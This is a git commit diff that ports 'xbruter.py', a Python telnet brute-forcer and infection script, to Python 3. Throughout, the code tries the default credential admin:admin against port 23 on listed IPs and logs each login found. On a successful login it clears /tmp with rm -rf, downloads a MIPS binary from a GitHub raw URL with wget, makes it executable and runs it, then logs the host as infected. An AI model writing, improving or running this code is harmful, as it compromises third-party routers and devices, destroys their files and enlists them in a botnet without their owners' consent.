36df6e1381bba0b36192d6f9436c5648beb81bc9
20Matrix77 <101499676+20Matrix77@users.noreply.github.com>
2024-10-16 19:36:26 +0500

    Update xbruter.py

--- xbruter.py
+++ xbruter.py
@@ -1,28 +1,22 @@
-#!/usr/bin/python
-
 import threading
 import sys
 import os
-import re
 import time
 import socket
 import select
-from queue import *
+from queue import Queue
 from sys import stdout
 
 p1 = "wget https://raw.githubusercontent.com/20Matrix77/jdifjshfirej/refs/heads/main/mips"
 p2 = "busybox wget https://raw.githubusercontent.com/20Matrix77/jdifjshfirej/refs/heads/main/mips"
 p3 = "/bin/busybox wget https://raw.githubusercontent.com/20Matrix77/jdifjshfirej/refs/heads/main/mips"
-p4 = "chmod 777 mips; ./mips" # Change Accordingly
+p4 = "chmod 777 mips; ./mips"
 
 if len(sys.argv) < 4:
-    print "Usage: python "+sys.argv[0]+" <list> <threads> <output file>"
+    print(f"Usage: python {sys.argv[0]} <list> <threads> <output file>")
     sys.exit()
 
-combo = [ 
-    "admin:admin",
-]
-
+combo = ["admin:admin"]
 ips = open(sys.argv[1], "r").readlines()
 threads = int(sys.argv[2])
 output_file = sys.argv[3]
@@ -31,151 +25,125 @@ queue_count = 0
 
 for ip in ips:
     queue_count += 1
-    stdout.write("\r[%d] Added to queue" % queue_count)
+    stdout.write(f"\r[{queue_count}] Added to queue")
     stdout.flush()
-    queue.put(ip)
-print "\n"
+    queue.put(ip.strip())
+print("\n")
 
-def readUntil(tn, string, timeout=8):
+def read_until(tn, string, timeout=8):
     buf = ''
     start_time = time.time()
     while time.time() - start_time < timeout:
-        buf += tn.recv(1024)
+        buf += tn.recv(1024).decode()
         time.sleep(0.1)
-        if string in buf: return buf
+        if string in buf:
+            return buf
     raise Exception('TIMEOUT!')
 
-def recvTimeout(sock, size, timeout=8):
+def recv_timeout(sock, size, timeout=8):
     sock.setblocking(0)
     ready = select.select([sock], [], [], timeout)
     if ready[0]:
         data = sock.recv(size)
-        return data
+        return data.decode()
     return ""
 
-class vbrxmr(threading.Thread):
-    def __init__ (self, ip):
-        threading.Thread.__init__(self)
-        self.ip = str(ip).rstrip('\n')
+class VbrXmr(threading.Thread):
+    def __init__(self, ip):
+        super().__init__()
+        self.ip = ip
+
     def run(self):
         global fh
-        global p1
-        global p2
-        global p3
-        global p4
-        username = ""
-        password = ""
+        username, password = "", ""
         for passwd in combo:
             if ":n/a" in passwd:
-                password=""
+                password = ""
             else:
-                password=passwd.split(":")[1]
+                password = passwd.split(":")[1]
             if "n/a:" in passwd:
-                username=""
+                username = ""
             else:
-                username=passwd.split(":")[0]
+                username = passwd.split(":")[0]
+
             try:
                 tn = socket.socket()
                 tn.settimeout(1)
-                tn.connect((self.ip,23))
+                tn.connect((self.ip, 23))
             except Exception:
-                tn.close()
-                break
+                continue
+
             try:
-                XDSL_BCM = ''
-                XDSL_BCM += readUntil(tn, ":")
+                XDSL_BCM = read_until(tn, ":")
                 if ":" in XDSL_BCM:
-                    tn.send(username + "\n")
+                    tn.send((username + "\n").encode())
                     time.sleep(0.09)
             except Exception:
                 tn.close()
+                continue
+            
             try:
-                XDSL_BCM = ''
-                XDSL_BCM += readUntil(tn, ":")
+                XDSL_BCM = read_until(tn, ":")
                 if ":" in XDSL_BCM:
-                    tn.send(password + "\n")
+                    tn.send((password + "\n").encode())
                     time.sleep(0.8)
-                else:
-                    pass
             except Exception:
                 tn.close()
+                continue
+
             try:
-                prompt = ''
-                prompt += tn.recv(40960)
-                if ">" in prompt and "ONT" not in prompt:
-                    success = True
-                elif "#" in prompt or "$" in prompt or "root@" in prompt or ">" in prompt:
-                    success = True              
-                else:
-                    tn.close()
-                if success == True:
-                    try:
-                        print "[XDSL_BCM] LOGIN FOUND - %s [%s:%s]"%(self.ip, username, password)
-                        fh.write(self.ip + ":23 " + username + ":" + password + "\n")
-                        fh.flush()
-                        tn.send("sh\r\n")
+                prompt = tn.recv(40960).decode()
+                success = any(s in prompt for s in [">", "#", "$", "root@"])
+                if success:
+                    print(f"[XDSL_BCM] LOGIN FOUND - {self.ip} [{username}:{password}]")
+                    fh.write(f"{self.ip}:23 {username}:{password}\n")
+                    fh.flush()
+                    tn.send("sh\r\n".encode())
+                    time.sleep(0.1)
+                    tn.send("shell\r\n".encode())
+                    time.sleep(0.1)
+                    tn.send("ls /\r\n".encode())
+                    time.sleep(1)
+                    
+                    timeout = 8
+                    buf = ''
+                    start_time = time.time()
+                    while time.time() - start_time < timeout:
+                        buf += recv_timeout(tn, 40960)
                         time.sleep(0.1)
-                        tn.send("shell\r\n")
-                        time.sleep(0.1)
-                        tn.send("ls /\r\n")
-                        time.sleep(1)
-                        timeout = 8
-                        buf = ''
-                        start_time = time.time()
-                        while time.time() - start_time < timeout:
-                            buf += recvTimeout(tn, 40960)
-                            time.sleep(0.1)
-                            if "tmp" in buf and "unrecognized" not in buf:
-                            	tn.send("sh\n")
-                            	time.sleep(1)
-                            	tn.send("cd /tmp\n")
-                            	tn.send("rm -rf *\n")
-                                tn.send(p1 + "\n")
-                                tn.send(p2 + "\n")
-                                tn.send(p3 + "\n")
-                                tn.send(p4 + "\n")
-                                print "[XDSL_BCM] INFECTED - %s [%s:%s]"%(self.ip, username, password)
-                                f = open("xdsl_bcm.txt", "a")
-                                f.write(self.ip + ":23 " + username + ":" + password + "\n")
-                                f.close()
-                                time.sleep(10)
-                                tn.close()
-                                break
-                        tn.close()
-                        break
-                    except:
-                        tn.close()
-                else:
+                        if "tmp" in buf and "unrecognized" not in buf:
+                            tn.send("sh\n".encode())
+                            time.sleep(1)
+                            tn.send("cd /tmp\n".encode())
+                            tn.send("rm -rf *\n".encode())
+                            tn.send((p1 + "\n").encode())
+                            tn.send((p2 + "\n").encode())
+                            tn.send((p3 + "\n").encode())
+                            tn.send((p4 + "\n").encode())
+                            print(f"[XDSL_BCM] INFECTED - {self.ip} [{username}:{password}]")
+                            with open("xdsl_bcm.txt", "a") as f:
+                                f.write(f"{self.ip}:23 {username}:{password}\n")
+                            time.sleep(10)
+                            tn.close()
+                            break
                     tn.close()
             except Exception:
                 tn.close()
 
 def worker():
-    try:
-        while True:
-            try:
-                IP = queue.get()
-                thread = vbrxmr(IP)
-                thread.start()
-                queue.task_done()
-                time.sleep(0.02)
-            except:
-                pass
-    except:
-        pass
+    while True:
+        try:
+            IP = queue.get()
+            thread = VbrXmr(IP)
+            thread.start()
+            queue.task_done()
+            time.sleep(0.02)
+        except Exception:
+            pass
 
-global fh
 fh = open(output_file, "a")
-global active
-active = 0
+for _ in range(threads):
+    threading.Thread(target=worker).start()
 
-for l in xrange(threads):
-    try:
-        t = threading.Thread(target=worker)
-        t.start()
-    except:
-        pass
-
-raw_input()
+input("Press Enter to exit...")  # Replaced raw_input with input
 os.kill(os.getpid(), 9)
-
